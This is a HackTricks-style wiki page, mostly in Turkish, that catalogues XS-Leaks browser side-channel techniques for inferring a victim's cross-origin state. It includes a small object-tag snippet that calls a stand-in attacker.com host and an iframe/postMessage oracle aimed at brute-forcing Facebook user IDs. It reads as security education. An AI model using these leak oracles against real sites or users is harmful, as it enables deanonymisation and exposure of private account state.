# XS-Search/XS-Leaks

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

XS-Search, **side channel vulnerabilities** kullanarak **cross-origin bilgi çıkarmak** için kullanılan bir yöntemdir.

Bu saldırıda yer alan temel bileşenler şunlardır:

- **Vulnerable Web**: Bilgi çıkarılmak istenen hedef web sitesi.
- **Attacker's Web**: Kurbanın ziyaret ettiği, saldırgan tarafından oluşturulan kötü amaçlı web sitesi ve exploit'i barındıran sayfa.
- **Inclusion Method**: Vulnerable Web'in Attacker's Web içine dahil edilmesi için kullanılan teknik (ör. window.open, iframe, fetch, HTML tag with href, vb.).
- **Leak Technique**: Inclusion method aracılığıyla toplanan bilgilere dayanarak Vulnerable Web'in durumundaki farklılıkları öğrenmek için kullanılan teknikler.
- **States**: Saldırganın ayırt etmeye çalıştığı Vulnerable Web'in iki olası durumu.
- **Detectable Differences**: Saldırganın Vulnerable Web'in durumunu çıkarmak için dayandığı gözlemlenebilir farklılıklar.

### Detectable Differences

Vulnerable Web'in durumlarını ayırt etmek için analiz edilebilecek çeşitli yönler:

- **Status Code**: Cross-origin olarak çeşitli HTTP response status code'ları (sunucu hataları, istemci hataları, kimlik doğrulama hataları gibi) ayırt etme.
- **API Usage**: Sayfalar arasında Web API kullanımını tanımlayarak, cross-origin bir sayfanın belirli bir JavaScript Web API'si kullanıp kullanmadığını ortaya çıkarma.
- **Redirects**: Sadece HTTP redirect'leri değil, JavaScript veya HTML tarafından tetiklenen yönlendirmeler dahil farklı sayfalara navigasyonları tespit etme.
- **Page Content**: HTTP response gövdesindeki veya sayfa alt-kaynaklarındaki farklılıkları gözlemleme; örneğin gömülü frame sayısı veya resimlerdeki boyut farklılıkları.
- **HTTP Header**: X-Frame-Options, Content-Disposition, Cross-Origin-Resource-Policy gibi özel bir HTTP response header'ının varlığını veya mümkünse değerini not etme.
- **Timing**: İki durum arasında tutarlı zaman farklarını fark etme.

### Inclusion Methods

- **HTML Elements**: Stylesheets, images veya scripts gibi cross-origin resource inclusion için çeşitli HTML elementleri vardır; tarayıcıyı non-HTML bir kaynağı istemeye zorlarlar. Bu amaç için potansiyel HTML elementlerinin derlemesi için bkz. [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
- **Frames**: iframe, object ve embed gibi elementler HTML kaynaklarını doğrudan saldırganın sayfasına gömebilir. Eğer sayfa framing protection'dan yoksunsa, JavaScript framed kaynağın window nesnesine contentWindow özelliği üzerinden erişebilir.
- **Pop-ups**: `window.open` metodu bir kaynağı yeni bir sekmede veya pencerede açar ve SOP sonrası JavaScript'in metotlar ve özelliklerle etkileşime girmesine olanak veren bir window handle sağlar. Pop-up'lar, genellikle single sign-on'da kullanılır ve hedef kaynağın framing ve cookie kısıtlamalarını aşabilir. Ancak modern tarayıcılar pop-up oluşturmayı belirli kullanıcı eylemleriyle sınırlamıştır.
- **JavaScript Requests**: JavaScript, hedef kaynaklara doğrudan XMLHttpRequests veya Fetch API kullanarak istek yapmaya izin verir. Bu yöntemler, HTTP redirect'leri takip etmeyi seçmek gibi isteğe dair hassas kontrol sağlar.

### Leak Techniques

- **Event Handler**: XS-Leaks içinde klasik bir leak tekniği; onload ve onerror gibi event handler'lar kaynak yüklemesinin başarılı veya başarısız olduğunu gösterir.
- **Error Messages**: JavaScript exception'ları veya özel hata sayfaları, hata mesajının kendisinden veya varlığı/olmaması arasındaki farktan leak bilgisi sağlayabilir.
- **Global Limits**: Tarayıcının hafıza kapasitesi veya diğer zorunlu tarayıcı limitleri gibi fiziksel kısıtlamalar, bir eşik aşıldığında sinyal vererek leak tekniği olarak kullanılabilir.
- **Global State**: Tarayıcıların global state'leriyle (ör. History interface) algılanabilir etkileşimler sömürülebilir. Örneğin, tarayıcı history'sindeki entry sayısı cross-origin sayfalar hakkında ipuçları verebilir.
- **Performance API**: Bu API, belge ve yüklenen kaynaklar için ağ zamanlamaları dahil olmak üzere mevcut sayfanın performans detaylarını sağlar; istenen kaynaklar hakkında çıkarımlar yapmaya imkan verir.
- **Readable Attributes**: Bazı HTML attribute'ları cross-origin olarak okunabilir ve leak tekniği olarak kullanılabilir. Örneğin, `window.frame.length` özelliği, cross-origin bir web sayfasına dahil edilen frame'lerin sayısını JavaScript ile saymaya izin verir.

## XSinator Tool & Paper

XSinator, tarayıcıları paper'ında açıklanan çeşitli bilinen XS-Leaks'e karşı otomatik olarak kontrol eden bir araçtır: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Araca şu adresten erişebilirsiniz: [**https://xsinator.com/**](https://xsinator.com/)

> [!WARNING]
> **Excluded XS-Leaks**: XSinator'da, diğer leak'lerle etkileşime girebilecekleri için **service workers**'a dayanan XS-Leaks'i çıkarmak zorunda kaldık. Ayrıca, belirli bir web uygulamasındaki yanlış yapılandırma ve hatalara dayanan XS-Leaks'i hariç tutmayı seçtik. Örneğin, CrossOrigin Resource Sharing (CORS) misconfigurations, postMessage leakage veya Cross-Site Scripting. Ek olarak, genellikle yavaş, gürültülü ve yanlış olabilen timebased XS-Leaks'i de hariç tuttuk.

## **Timing Based techniques**

Aşağıdaki tekniklerin bazıları, web sayfalarının olası durumlarındaki farkları algılamak için zamanlamayı süreç içinde kullanacaktır. Bir web tarayıcısında zamanı ölçmenin farklı yolları vardır.

**Clocks**: [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API'si geliştiricilerin yüksek çözünürlüklü zaman ölçümleri almasına olanak tanır.\
Saldırganların implicit clock oluşturmak için suistimal edebileceği birçok API vardır: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations ve diğerleri.\
Daha fazla bilgi için: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Event Handler Techniques

### Onload/Onerror

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
- **Summary**: Bir kaynağı yüklemeye çalışırken onerror/onload event'leri kaynak başarılı/başarısız yüklendiğinde tetikleniyor; bu sayede status code'u çıkarmak mümkün olabilir.
- **Code example**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](<https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)>)


{{#ref}}
cookie-bomb-+-onerror-xs-leak.md
{{#endref}}

Kod örneği JS'den script nesnelerini load etmeye çalışıyor, ancak objects, stylesheets, images, audios gibi **diğer tag'lar** da kullanılabilir. Ayrıca, tag'ı **doğrudan enjekte etmek** ve `onload` ile `onerror` event'lerini tag içinde (JS'den enjekte etmek yerine) tanımlamak da mümkündür.

Bu saldırının script-less bir versiyonu da vardır:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Bu durumda eğer `example.com/404` bulunamazsa `attacker.com/?error` yüklenecektir.

### Content-Type/CORB script load oracle

- **Dahil Etme Yöntemleri**: HTML Elements (script)
- **Algılanabilir Fark**: Header / Content-Type via onload vs onerror (CORB)
- **Özet:** Eğer bir endpoint eşleşmede HTML, eşleşmeme durumunda JSON döndürüyorsa, bunu `<script src>` ile yükleyin. HTML `onload` tetikler; JSON CORB tarafından engellenir ve `onerror` tetikler; bu da bilinen bir kapsam içinde `__user` gibi tanımlayıcıları brute-force etmek için bir Boolean oracle sağlar.
- **Notlar:** Gövdeleri okumadan cross-origin çalışır; bir tenant ID sabit olduğunda aktif hesabı belirlemek için kullanışlıdır.

### postMessage vs X-Frame-Options deny oracle

- **Dahil Etme Yöntemleri**: Frames
- **Algılanabilir Fark**: Header (XFO) + postMessage presence/absence
- **Özet:** Bazı widget'lar yüklendikten sonra parent'ına postMessage gönderir. Eğer istek yanlış bir tanımlayıcı ile frame'lenirse, sunucu `X-Frame-Options: deny` ile yanıt verip render'ı engelleyebilir ve dolayısıyla mesaj gönderilmez. iframe'in `src`'sini aday ID ile ayarlayıp bir `message` eventi bekleyerek (başarı) ve timeout/mesaj yok ise başarısızlık sayarak aktif hesap brute-force edilebilir.
- **Minimal snippet:**
```html
<iframe id=fb width=0 height=0></iframe>
<script>
function test(id){
fb.src=`https://www.facebook.com/plugins/like.php?__a=1&__user=${id}`;
return new Promise(r=>{
const t=setTimeout(()=>r(false),2000);
onmessage=()=>{clearTimeout(t);r(true);}
});
}
</script>
```
- **Related:**
{{#ref}}
../postmessage-vulnerabilities/README.md
{{#endref}}

{{#ref}}
../iframe-traps.md
{{#endref}}

daha fazla mesaj/iframe tuzakları için.

### Onload Timing

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Timing (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
- **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** bir isteğin tamamlanmasının ne kadar sürdüğünü ölçmek için kullanılabilir. Ancak, [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) gibi diğer clock'lar da kullanılabilir; bu API 50ms'den uzun süren görevleri tespit edebilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) başka bir örnek:

{{#ref}}
performance.now-example.md
{{#endref}}

#### Onload Timing + Forced Heavy Task

Bu teknik öncekiyle aynıdır, ancak **attacker** ayrıca **pozitif veya negatif yanıt** durumunda bir eylemin **kayda değer bir süre** almasını **zorlayacak** ve bu süreyi ölçecektir.

{{#ref}}
performance.now-+-force-heavy-task.md
{{#endref}}

### unload/beforeunload Timing

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
- **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) bir isteğin tamamlanmasının ne kadar sürdüğünü ölçmek için kullanılabilir. Diğer clock'lar da kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Bir kaynağın alınması için geçen süre, [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) ve [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) event'lerini kullanarak ölçülebilir. **`beforeunload`** eventi tarayıcının yeni bir sayfaya gitmek üzere olduğu anda tetiklenirken, **`unload`** eventi ise navigasyon gerçekten gerçekleşirken meydana gelir. Bu iki event arasındaki zaman farkı hesaplanarak tarayıcının kaynağı almak için harcadığı **süre** belirlenebilir.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

- **Inclusion Methods**: Frames
- **Detectable Difference**: Timing (genellikle Sayfa İçeriği, Durum Kodu nedeniyle)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
- **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API bir isteğin tamamlanmasının ne kadar sürdüğünü ölçmek için kullanılabilir. Diğer clock'lar da kullanılabilir.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Framing Protections olmadığında, bir sayfanın ve onun alt kaynaklarının ağ üzerinden yüklenme süresi bir attacker tarafından ölçülebilir olduğu gözlemlenmiştir. Bu ölçüm genellikle iframe'in `onload` handler'ının yalnızca kaynak yüklemesi ve JavaScript yürütmesi tamamlandıktan sonra tetiklenmesi nedeniyle mümkündür. Script yürütmesinin yarattığı değişkenliği aşmak için attacker `<iframe>` içinde [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute'unu kullanabilir. Bu attribute birçok işlevi, özellikle JavaScript yürütmeyi kısıtlar ve böylece ölçümü büyük ölçüde ağ performansının etkilediği bir hale getirir.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary**: Doğru içerik erişildiğinde sayfayı hata verecek şekilde ve herhangi bir içerik erişildiğinde doğru şekilde yüklenecek şekilde kontrol edebiliyorsanız, zamanı ölçmeden tüm bilgiyi çıkarmak için bir döngü oluşturabilirsiniz.
- **Code Example**:

Suppose that you can **insert** the **page** that has the **secret** content **inside an Iframe**.

You can **make the victim search** for the file that contains "_**flag**_" using an **Iframe** (exploiting a CSRF for example). Inside the Iframe you know that the _**onload event**_ will be **executed always at least once**. Then, you can **change** the **URL** of the **iframe** but changing only the **content** of the **hash** inside the URL.

For example:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

If the first URL was **successfully loaded**, then, when **changing** the **hash** part of the URL the **onload** event **won't be triggered** again. But **if** the page had some kind of **error** when **loading**, then, the **onload** event will be **triggered again**.

Then, you can **distinguish between** a **correctly** loaded page or page that has an **error** when is accessed.

### Javascript Execution

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**:
- **Summary:** Eğer sayfa hassas içeriği döndürüyorsa veya kullanıcı tarafından kontrol edilebilen bir içerik varsa, kullanıcı negatif durumda geçerli JS kodu ayarlayıp her denemede `<script>` etiketleri içinde yükleyebilir; böylece negatif durumlarda saldırganın kodu çalıştırılır, olumlu durumlarda ise hiçbir şey çalıştırılmaz.
- **Code Example:**


{{#ref}}
javascript-execution-xs-leak.md
{{#endref}}

### CORB - Onerror

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code & Headers
- **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
- **Summary**: **Cross-Origin Read Blocking (CORB)**, Spectre gibi saldırılara karşı bazı cross-origin hassas kaynakların yüklenmesini engelleyen bir güvenlik önlemidir. Ancak saldırganlar bu koruyucu davranışı istismar edebilir. CORB tarafından korunan bir response `Content-Type` ile `nosniff` ve `2xx` durum kodu döndüğünde, **CORB** response gövdesini ve header'ları kaldırır. Bunu gözlemleyen saldırganlar, başarı veya hata gösteren **status code** ile CORB tarafından korunup korunmadığını belirten `Content-Type` kombinasyonunu çıkararak potansiyel bilgi leak'leri elde edebilirler.
- **Code Example:**

Check the more information link for more information about the attack.

### onblur

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
- **Summary**: id veya name attribute'undan hassas veriyi leak edin.
- **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

It's possible to **load a page** inside an **iframe** and use the **`#id_value`** to make the page **focus on the element** of the iframe with indicated if, then if an **`onblur`** signal is triggered, the ID element exists.\
You can perform the same attack with **`portal`** tags.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
- **Summary**: postMessage'dan hassas bilgileri toplayın veya postMessage varlığını sayfa üzerindeki kullanıcının durumunu bilmek için bir oracle olarak kullanın
- **Code Example**: `Any code listening for all postMessages.`

Applications frequently utilize [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) to communicate across different origins. However, this method can inadvertently expose **sensitive information** if the `targetOrigin` parameter is not properly specified, allowing any window to receive the messages. Furthermore, the mere act of receiving a message can act as an **oracle**; for instance, certain messages might only be sent to users who are logged in. Therefore, the presence or absence of these messages can reveal information about the user's state or identity, such as whether they are authenticated or not.

## Global Limits Techniques

### WebSocket API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: WebSocket bağlantı limitini tüketmek, cross-origin bir sayfanın kullandığı WebSocket bağlantılarının sayısını leak eder.
- **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)>), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](<https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)>)

It is possible to identify if, and how many, **WebSocket connections a target page uses**. It allows an attacker to detect application states and leak information tied to the number of WebSocket connections.

If one **origin** uses the **maximum amount of WebSocket** connection objects, regardless of their connections state, the creation of **new objects will result in JavaScript exceptions**. To execute this attack, the attacker website opens the target website in a pop-up or iframe and then, after the target web has been loaded, attempts to create the maximum number of WebSockets connections possible. The **number of thrown exceptions** is the **number of WebSocket connections used by the target website** window.

### Payment API

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: API Usage
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
- **Summary**: Sadece bir tane aktif olabildiği için Payment Request'i tespit edin.
- **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

This XS-Leak enables an attacker to **detect when a cross-origin page initiates a payment request**.

Because **only one request payment can be active** at the same time, if the target website is using the Payment Request API, any f**urther attempts to show use this API will fail**, and cause a **JavaScript exception**. The attacker can exploit this by **periodically attempting to show the Payment API UI**. If one attempt causes an exception, the target website is currently using it. The attacker can hide these periodical attempts by immediately closing the UI after creation.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
- **Summary:** Tek iş parçacıklı JS event loop'unu kötüye kullanarak bir web'in yürütme süresini ölçün.
- **Code Example**:


{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

JavaScript operates on a [single-threaded event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) concurrency model, signifying that **it can only execute one task at a time**. This characteristic can be exploited to gauge **how long code from a different origin takes to execute**. An attacker can measure the execution time of their own code in the event loop by continuously dispatching events with fixed properties. These events will be processed when the event pool is empty. If other origins are also dispatching events to the same pool, an **attacker can infer the time it takes for these external events to execute by observing delays in the execution of their own tasks**. This method of monitoring the event loop for delays can reveal the execution time of code from different origins, potentially exposing sensitive information.

> [!WARNING]
> In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

- **Inclusion Methods**:
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
- **Summary:** Bir web operasyonunun yürütme süresini ölçmenin bir yöntemi, bir thread'in event loop'unu kasıtlı olarak engellemek ve sonra event loop'un tekrar kullanılabilir hale gelmesi için ne kadar sürdüğünü zamanlamaktır. Uzun bir hesaplama veya senkron bir API çağrısı gibi bir bloklama operasyonu event loop'a yerleştirilip, sonrasında gelen kodun çalışmaya başlaması için geçen süre izlenirse, bloklama süresi sırasında event loop'ta çalışan görevlerin süresi çıkarılabilir. Bu teknik, JavaScript'in tek iş parçacıklı event loop yapısından faydalanır ve aynı thread'i paylaşan diğer operasyonların davranışı veya performansı hakkında içgörüler sağlayabilir.
- **Code Example**:

A significant advantage of the technique of measuring execution time by locking the event loop is its potential to circumvent **Site Isolation**. **Site Isolation** is a security feature that separates different websites into separate processes, aiming to prevent malicious sites from directly accessing sensitive data from other sites. However, by influencing the execution timing of another origin through the shared event loop, an attacker can indirectly extract information about that origin's activities. This method does not rely on direct access to the other origin's data but rather observes the impact of that origin's activities on the shared event loop, thus evading the protective barriers established by **Site Isolation**.

> [!WARNING]
> In an execution timing it's possible to **eliminate** **network factors** to obtain **more precise measurements**. For example, by loading the resources used by the page before loading it.

### Connection Pool

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
- **Summary:** Bir saldırgan, tüm soketleri 1 hariç kilitleyip hedef web'i yükleyebilir ve aynı anda başka bir sayfa daha yükleyerek son sayfanın yüklenmeye başlamasına kadar geçen süreyi hedef sayfanın yüklenme süresi olarak ölçebilir.
- **Code Example**:


{{#ref}}
connection-pool-example.md
{{#endref}}

Browsers utilize sockets for server communication, but due to the limited resources of the operating system and hardware, **browsers are compelled to impose a limit** on the number of concurrent sockets. Attackers can exploit this limitation through the following steps:

1. Ascertain the browser's socket limit, for instance, 256 global sockets.
2. Occupy 255 sockets for an extended duration by initiating 255 requests to various hosts, designed to keep the connections open without completing.
3. Employ the 256th socket to send a request to the target page.
4. Attempt a 257th request to a different host. Given that all sockets are in use (as per steps 2 and 3), this request will be queued until a socket becomes available. The delay before this request proceeds provides the attacker with timing information about the network activity related to the 256th socket (the target page's socket). This inference is possible because the 255 sockets from step 2 are still engaged, implying that any newly available socket must be the one released from step 3. The time taken for the 256th socket to become available is thus directly linked to the time required for the request to the target page to complete.

For more info: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

- **Inclusion Methods**: JavaScript Requests
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**:
- **Summary:** Önceki tekniğe benzer, fakat Chrome aynı origin'e yapılan eşzamanlı istekleri **6** ile sınırlar. Eğer 5'ini bloklarsak ve sonra 6. isteği başlatırsak, onu zamanlayabiliriz; eğer hedef sayfa aynı endpoint'e daha fazla istek gönderiyorsa 6. istek daha uzun sürecek ve bunu tespit edebiliriz.

## Performance API Techniques

The [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) offers insights into the performance metrics of web applications, further enriched by the [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). The Resource Timing API enables the monitoring of detailed network request timings, such as the duration of the requests. Notably, when servers include the `Timing-Allow-Origin: *` header in their responses, additional data like the transfer size and domain lookup time becomes available.

This wealth of data can be retrieved via methods like [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) or [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), providing a comprehensive view of performance-related information. Additionally, the API facilitates the measurement of execution times by calculating the difference between timestamps obtained from [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). However, it's worth noting that for certain operations in browsers like Chrome, the precision of `performance.now()` may be limited to milliseconds, which could affect the granularity of timing measurements.

Beyond timing measurements, the Performance API can be leveraged for security-related insights. For instance, the presence or absence of pages in the `performance` object in Chrome can indicate the application of `X-Frame-Options`. Specifically, if a page is blocked from rendering in a frame due to `X-Frame-Options`, it will not be recorded in the `performance` object, providing a subtle clue about the page's framing policies.

### Error Leak

- **Inclusion Methods**: Frames, HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Hata ile sonuçlanan bir istek resource timing entry oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

It is possible to **differentiate between HTTP response status codes** because requests that lead to an **error** do **not create a performance entry**.

### Style Reload Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Bir tarayıcı bug'ı nedeniyle, hata ile sonuçlanan istekler iki kez yüklenir.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In the previous technique it was also identified two cases where browser bugs in GC lead to **resources being loaded twice when they fail to load**. This will result in multiple entries in the Performance API and can thus be detected.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Status Code
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Hata ile sonuçlanan istekler merge edilemez.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

The technique was found in a table in the mentioned paper but no description of the technique was found on it. However, you can find the source code checking for it in [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Boş cevaplar resource timing entry oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

An attacker can detect if a request resulted in an empty HTTP response body because e**mpty pages do not create a performance entry in some browsers**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Page Content
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** XSS Auditor'ü Security Assertions içinde kullanarak, crafted payload'lar auditor'ün filtreleme mekanizmasını tetiklediğinde yanıtlarındaki değişiklikleri gözlemleyerek belirli webpage element'lerini tespit edebilirsiniz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Security Assertions (SA), the XSS Auditor, originally intended to prevent Cross-Site Scripting (XSS) attacks, can paradoxically be exploited to leak sensitive information. Although this built-in feature was removed from Google Chrome (GC), it's still present in SA. In 2013, Braun and Heiderich demonstrated that the XSS Auditor could inadvertently block legitimate scripts, leading to false positives. Building on this, researchers developed techniques to extract information and detect specific content on cross-origin pages, a concept known as XS-Leaks, initially reported by Terada and elaborated by Heyes in a blog post. Although these techniques were specific to the XSS Auditor in GC, it was discovered that in SA, pages blocked by the XSS Auditor do not generate entries in the Performance API, revealing a method through which sensitive information might still be leaked.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** X-Frame-Options header'ına sahip bir resource resource timing entry oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

If a page is **not allowed** to be **rendered** in an **iframe** it does **not create a performance entry**. As a result, an attacker can detect the response header **`X-Frame-Options`**.\
Same happens if you use an **embed** **tag.**

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** ContentDisposition nedeniyle indirilen kaynaklar Performance API'de resource timing entry oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Similar, to the XS-Leak described, a **resource that is downloaded** because of the ContentDisposition header, also does **not create a performance entry**. This technique works in all major browsers.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Resource timing entry redirect başlangıç zamanını leak eder.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

We found one XS-Leak instance that abuses the behavior of some browsers which log too much information for cross-origin requests. The standard defines a subset of attributes that should be set to zero for cross-origin resources. However, in **SA** it is possible to detect if the user is **redirected** by the target page, by querying the **Performance API** and checking for the **redirectStart timing data**.

